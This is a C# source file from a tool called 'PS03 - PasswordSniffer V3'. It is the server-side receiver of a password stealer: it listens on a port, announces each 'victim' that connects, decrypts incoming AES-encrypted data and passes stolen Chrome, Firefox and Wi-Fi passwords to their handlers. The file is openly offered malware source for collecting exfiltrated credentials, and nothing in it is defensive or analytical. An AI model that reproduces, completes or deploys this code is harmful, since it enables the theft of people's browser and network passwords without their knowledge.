using System;
using PS03.Network.Receive.Handlers;
using PS03.Network.Receive.PostOp;

namespace PS03.Network.Receive
{
    public class Receiver
    {
        private static readonly PasswordCounter pwc = new PasswordCounter();
        private readonly ChromeHandler chromehandler = new ChromeHandler(pwc);
        private readonly FirefoxHandler firefoxhandler = new FirefoxHandler(pwc);
        private readonly WifiHandler wifihandler = new WifiHandler(pwc);


        public void Run(int port)
        {
            var data = " ============== PS03 - PasswordSniffer V3 ============== ";
            var under = "=========================";
            var quote =
                "\"Passwords are like underwear; you don’t let people see it, you should change it very often, and you shouldn’t share it with strangers\" – Chris Pirill";

            Console.ForegroundColor = ConsoleColor.White;
            Console.SetCursorPosition((Console.WindowWidth - data.Length)/2, Console.CursorTop);
            Console.WriteLine(data);
            Console.SetCursorPosition((Console.WindowWidth - under.Length)/2, Console.CursorTop);
            Console.WriteLine(under);
            Console.WriteLine();
            Console.SetCursorPosition((Console.WindowWidth - 80)/2, Console.CursorTop);
            Console.WriteLine(quote);
            Console.WriteLine();
            Console.WriteLine();

            Console.ResetColor();


            Go(port);
        }

        private void ReceivedData(string data)
        {
            var dec = new SimpleAES();
            var unencrypted = dec.DecryptString(data);
            if (unencrypted.StartsWith("CHROME:"))
                chromehandler.Handle(unencrypted);
            else if (unencrypted.StartsWith("FIREFOX:"))
                firefoxhandler.Handle(unencrypted);
            else if (unencrypted.StartsWith("WIFI:"))
                wifihandler.Handle(unencrypted);
        }

        private void ClientConnected(string client)
        {
            var data = "Victim connected from: " + client;
            Console.ForegroundColor = ConsoleColor.White;
            Console.SetCursorPosition((Console.WindowWidth - data.Length)/2, Console.CursorTop);
            Console.WriteLine(data);
        }


        private void Go(int port)
        {
            var listener = new Listener();
            listener.OnVictimConnected += ClientConnected;
            listener.OnOutputReady += ReceivedData;
            listener.start(port);
        }
    }
}